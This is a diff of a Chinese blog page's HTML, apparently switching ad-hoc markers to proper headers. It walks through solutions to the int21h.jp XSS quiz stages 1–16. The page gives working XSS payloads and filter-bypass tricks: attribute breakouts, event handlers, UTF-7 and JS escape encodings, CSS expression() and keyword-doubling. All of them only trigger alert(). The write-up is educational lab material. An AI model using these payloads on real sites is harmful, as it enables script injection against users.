@@ -295,15 +295,13 @@
             <blockquote>
 <p>这个挺有意思的，好像日本的一个学生写的，入门XSS，感觉学到了不少！</p>
 </blockquote>
-<p>#第一关：</p>
-<blockquote>
+<h1 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h1><blockquote>
 <p><font color="red"><a href="http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5" target="_blank" rel="external">http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5</a></font><br></p>
 </blockquote>
 <pre><code>&lt;img onerror=&quot;alert(document.domain);&quot; src= /&gt; 
 </code></pre><p>or</p>
 <pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
-</code></pre><p>#第二关</p>
-<blockquote>
+</code></pre><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><blockquote>
 <p><font color="red"><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></font><br></p>
 </blockquote>
 <p>先用</p>
@@ -312,8 +310,7 @@
 <pre><code>&lt;INPUT size=50 value=&quot;&lt;script&gt;alert(document.domain);&lt;/script&gt;&quot; name=p1&gt;
 </code></pre><p>没有过滤，可以组合js，闭合value=“”，进行注入！</p>
 <pre><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;
-</code></pre><p>#第三关</p>
-<blockquote>
+</code></pre><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></font>
 
 </blockquote>
@@ -337,22 +334,19 @@ Choose a country: &lt;select name=&quot;p2&quot;&gt;
 </code></pre><p>发现innerHTML不能插入js，我需要js字符串，而不是代码，那么可以用innerText属性。</p>
 <pre><code>document.forms[0].p2.childNodes[1].innerText = &apos;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
 </code></pre><p>这样，select的第一个选项已经被修改，接下来随便输入并提交，ok。</p>
-<p>#第四关</p>
-<blockquote>
+<h1 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h1><blockquote>
 <p><font color="red"><a href="http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_4.php?sid=95a179f3d0230ffe9a4d12c5b049ea1aa9d27242</a></font><br></p>
 </blockquote>
 <p>此时，select和input均作了过滤，都不能进行注入，但是查看发现，有隐藏输入框，可以尝试注入。</p>
 <pre><code>document.forms[0].p3.value = &apos;&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&apos;
-</code></pre><p>#第五关</p>
-<blockquote>
+</code></pre><h1 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h1><blockquote>
 <p><font color="red"><a href="http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage--5.php?sid=d83cbbb5c8b5fc0b9bc4677c3a51287aa17b7adc</a></font><br></p>
 </blockquote>
 <p>长度限制，发现限制了文本输入长度，但只在表面上做了限制。</p>
 <pre><code>document.forms[0].p1.maxlength = 100
 </code></pre><p>修改输入框输入内容长度限制。然后注入：</p>
 <pre><code>document.forms[0].p1.value = &apos;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;&quot;&apos;
-</code></pre><p>#第六关</p>
-<blockquote>
+</code></pre><h1 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h1><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-no6.php?sid=53cb838f6fe2a388b3e2adf56290494fe9edf999</a></font>
 
 </blockquote>
@@ -388,15 +382,13 @@ Conditional comments(IE)
 &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;
 &lt;![endif]--&gt;
 </code></pre><p>Conditional comments(条件注释)：定义了一些通过IE执行的HTML标记</p>
-<p>#第七关</p>
-<blockquote>
+<h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2</a></font>
 
 </blockquote>
 <pre><code>&quot; onfocus=alert(document.domain);
 </code></pre><p>上面第六关还是能注入，不知道后台验证怎么处理的？</p>
-<p>#第八关</p>
-<blockquote>
+<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5</a></font>
 
 </blockquote>
@@ -404,8 +396,7 @@ Conditional comments(IE)
 <blockquote>
 <p>javascript:alert(document.domain);</p>
 </blockquote>
-<p>#第九关</p>
-<blockquote>
+<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9</a></font>
 
 </blockquote>
@@ -413,8 +404,7 @@ Conditional comments(IE)
 <pre><code>&lt;INPUT size=50 name=p1&gt;
 &lt;INPUT type=hidden value=euc-jp name=charset&gt;
 </code></pre><p>可以利用了IE对于UTF-7的漏洞，过滤对于UTF-7的不支持，以及IE对于UTF-7的漏洞！</p>
-<p>##UTF-7</p>
-<blockquote>
+<h2 id="UTF-7"><a href="#UTF-7" class="headerlink" title="UTF-7"></a>UTF-7</h2><blockquote>
 <p>用以将Unicode字符以ASCII编码的字符串来呈现。</p>
 </blockquote>
 <pre><code>&lt;INPUT name=&quot;charset&quot; type=&quot;hidden&quot; value=&quot;utf-7&quot; &gt;
@@ -424,8 +414,7 @@ Conditional comments(IE)
 <pre><code>+ACI onfocus+AD0AIg-alert(document.domain)+ADs-
 </code></pre><p>这个编码网站挺全的：</p>
 <p><strong><a href="http://toolswebtop.com/text/process/encode(" target="_blank" rel="external">http://toolswebtop.com/text/process/encode(</a><a href="http://toolswebtop.com/text/process/encode" target="_blank" rel="external">点击</a>)</strong></p>
-<p>##第十关</p>
-<blockquote>
+<h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3</a></font>
 
 </blockquote>
@@ -434,8 +423,7 @@ Conditional comments(IE)
 <p>例如他过滤了“domain”关键字，那么只要domain出现，就会被替换，那么可以在domain关键字中间再加一个，组成“dodomainmain”，这样中间的domain被过滤，剩下的部分组成domain，这样就越过了！（好机智！）</p>
 </blockquote>
 <pre><code>&quot; onfocus=&quot;alert(document.dodomainmain)&quot;
-</code></pre><p>#第十一关：</p>
-<blockquote>
+</code></pre><h1 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h1><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83</a></font>
 
 </blockquote>
@@ -447,7 +435,7 @@ Conditional comments(IE)
 <blockquote>
 <p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;” </p>
 <p>说明过滤了on.*等一大部分， s.*和script.会变成\<xscript> </xscript></p>
-<p>##制表符越过<br>输入：</p>
+<h2 id="制表符越过"><a href="#制表符越过" class="headerlink" title="制表符越过"></a>制表符越过</h2><p>输入：</p>
 </blockquote>
 <pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain);&quot;&gt;XSS&lt;/a&gt;
 </code></pre><p>源码发现：</p>
@@ -466,8 +454,7 @@ Conditional comments(IE)
 <pre><code>&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus=&quot;al&amp;#9;ert(document.dodomainmain)&quot;&gt;
 </code></pre><p>这个HTML的转义应该是针对字符串的;</p>
 <p>总结：以后尽量把结果引向\<a href="">。</a></p>
-<p>#第十二关</p>
-<blockquote>
+<h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><blockquote>
 <font color="red">http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988</font>
 
 </blockquote>
@@ -475,15 +462,13 @@ Conditional comments(IE)
 <p>再看Hint：</p>
 <pre><code>&quot;s/[\x00-\x20\&lt;\&gt;\&quot;\&apos;]//g;&quot; 
 </code></pre><p>x00~x20都被过滤，制表符无法使用了！，同样，&lt;&gt; “  ‘都被滤了！</p>
-<p>##利用IE ``的漏洞</p>
-<p>IE对于反单引号没有很好的过滤，使用  ``  可以很轻松的截断输入，但是在google下测试，发现 `` 被过滤了。<br>&gt;</p>
+<h2 id="利用IE-的漏洞"><a href="#利用IE-的漏洞" class="headerlink" title="利用IE ``的漏洞"></a>利用IE ``的漏洞</h2><p>IE对于反单引号没有很好的过滤，使用  ``  可以很轻松的截断输入，但是在google下测试，发现 `` 被过滤了。<br>&gt;</p>
 <blockquote>
 <p><font color='red'><strong>`</strong></font>:反单引号，上排数字键1的前面，其上档符号是“~ ”</p>
 </blockquote>
 <p>可以截断输入，那就好办了！</p>
 <pre><code>`` onfocus=&quot;alert(document.domain);&quot;  //IE下可行
-</code></pre><p>#第十三关</p>
-<blockquote>
+</code></pre><h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><blockquote>
 <font color="red">http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6</font>
 
 </blockquote>
@@ -500,8 +485,7 @@ body{xss:expression(alert(&apos;xss&apos;))]
 </code></pre><p>(2)css代码中js，vs脚本</p>
 <pre><code>body{backgroud-image:url(javascript:alert(&apos;xss&apos;))}  
 body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))} 
-</code></pre><p>#第十四关</p>
-<blockquote>
+</code></pre><h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><blockquote>
 <font color="red">http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8</font>
 
 <p>发现expression关键字被正则了！绕过<strong>(IE8即以下！)</strong>：<br></p>
@@ -520,8 +504,7 @@ body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))}
 </blockquote>
 <pre><code>aa:e/**/xpression(onfocus = function(){alert(document.domain)}) ok
 </code></pre><p><strong><font color="orange">\uxxxx这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 \u5c0f 表示汉语中的 ‘小’字，转换成10进制就是9215，所以在byte数组中应该是1592.</font></strong></p>
-<p>#第十五关</p>
-<blockquote>
+<h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><blockquote>
 <font color="red">http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1</font>
 
 </blockquote>
@@ -539,8 +522,7 @@ body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))}
 </code></pre><p>能成功的原因在于使用：</p>
 <pre><code>document.write();
 </code></pre><p>执行了js，将字符串编译了！</p>
-<p>##JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;<a href="http://www.cnblogs.com/ecalf/archive/2012/09/04/unicode.html">参见</a>&gt;</p>
-<blockquote>
+<h2 id="JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt"><a href="#JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt" class="headerlink" title="JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;参见&gt;"></a>JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;<a href="http://www.cnblogs.com/ecalf/archive/2012/09/04/unicode.html">参见</a>&gt;</h2><blockquote>
 <p><strong>所有的ASCII码都可以用“\”加数字（一般是8进制数字）来表示。\x表示后面的字符是十六进制数，\表示后面的字符是八进制数。</strong><br> </p>
 </blockquote>
 <p>八进制（+八进制）</p>
@@ -557,8 +539,7 @@ body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))}
 <p>\u 加 4个16进制字符表示一个字符的编码</p>
 </blockquote>
 <pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
-</code></pre><p>#十六关</p>
-<blockquote>
+</code></pre><h1 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h1><blockquote>
 <font color="red"><a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d">http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d</a></font>
 
 </blockquote>
@@ -566,8 +547,7 @@ body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))}
 <pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
 
 \\74script\\76alert(document.domain);\\74/script\\76
-</code></pre><p>##第十七十八（UNSOLVED）</p>
-<blockquote>
+</code></pre><h2 id="第十七十八（UNSOLVED）"><a href="#第十七十八（UNSOLVED）" class="headerlink" title="第十七十八（UNSOLVED）"></a>第十七十八（UNSOLVED）</h2><blockquote>
 <p>需要配合IE6即以下浏览器解决！</p>
 </blockquote>
 </script></p>
